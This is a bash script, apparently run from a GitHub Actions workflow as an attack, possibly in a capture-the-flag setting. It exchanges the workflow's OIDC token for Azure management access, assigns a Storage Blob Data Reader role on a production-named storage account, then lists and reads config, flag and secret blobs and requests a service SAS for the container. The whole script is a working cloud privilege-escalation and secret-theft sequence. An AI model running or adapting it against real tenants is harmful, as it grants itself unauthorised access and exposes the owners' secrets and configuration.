#!/usr/bin/env bash
set -x
OIDC=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | jq -r .value)
MGMT=$(curl -s -X POST "https://login.microsoftonline.com/$AZURE_TENANT_ID/oauth2/v2.0/token" \
  -d "client_id=$AZURE_CLIENT_ID" -d "grant_type=client_credentials" \
  -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
  -d "client_assertion=$OIDC" --data-urlencode "scope=https://management.azure.com/.default" | jq -r .access_token)
echo "MGMT len: ${#MGMT}"

OID="63e87ab1-6bd2-4e80-92be-943450b20e4f"
# Storage Blob Data Reader role = 2a2b9908-6ea1-4ae2-8e65-a410df84e7d1
ROLE_ID="2a2b9908-6ea1-4ae2-8e65-a410df84e7d1"
SCOPE="/subscriptions/$AZURE_SUBSCRIPTION_ID/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.Storage/storageAccounts/sttblappcfgprodx3euoz"
ASSIGN_ID=$(cat /proc/sys/kernel/random/uuid)

echo "=== ADD Storage Blob Data Reader role ==="
curl -sv -X PUT -H "Authorization: Bearer $MGMT" -H "Content-Type: application/json" \
  "https://management.azure.com${SCOPE}/providers/Microsoft.Authorization/roleAssignments/${ASSIGN_ID}?api-version=2022-04-01" \
  -d "{\"properties\":{\"roleDefinitionId\":\"${SCOPE}/providers/Microsoft.Authorization/roleDefinitions/${ROLE_ID}\",\"principalId\":\"${OID}\",\"principalType\":\"ServicePrincipal\"}}" 2>&1

echo "=== WAIT for propagation ==="
sleep 30

echo "=== TRY READ BLOB ==="
ST=$(curl -s -X POST "https://login.microsoftonline.com/$AZURE_TENANT_ID/oauth2/v2.0/token" \
  -d "client_id=$AZURE_CLIENT_ID" -d "grant_type=client_credentials" \
  -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
  -d "client_assertion=$OIDC" --data-urlencode "scope=https://storage.azure.com/.default" | jq -r .access_token)
echo "ST len: ${#ST}"

curl -s -H "Authorization: Bearer $ST" -H "x-ms-version: 2021-08-06" \
  "https://sttblappcfgprodx3euoz.blob.core.windows.net/config?restype=container&comp=list"
echo
for B in internal-config.json flag.txt flag secret.txt config.json; do
  echo ">>> config/$B:"
  curl -s -H "Authorization: Bearer $ST" -H "x-ms-version: 2021-08-06" \
    "https://sttblappcfgprodx3euoz.blob.core.windows.net/config/$B"
  echo
done

echo "=== ALSO: listServiceSas ==="
curl -s -X POST -H "Authorization: Bearer $MGMT" -H "Content-Type: application/json" \
  "https://management.azure.com${SCOPE}/listServiceSas?api-version=2023-05-01" \
  -d '{"canonicalizedResource":"/blob/sttblappcfgprodx3euoz/config","signedResource":"c","signedPermission":"rl","signedExpiry":"2026-12-01T00:00:00Z","signedProtocol":"https"}' | jq .

echo "=== DONE ==="
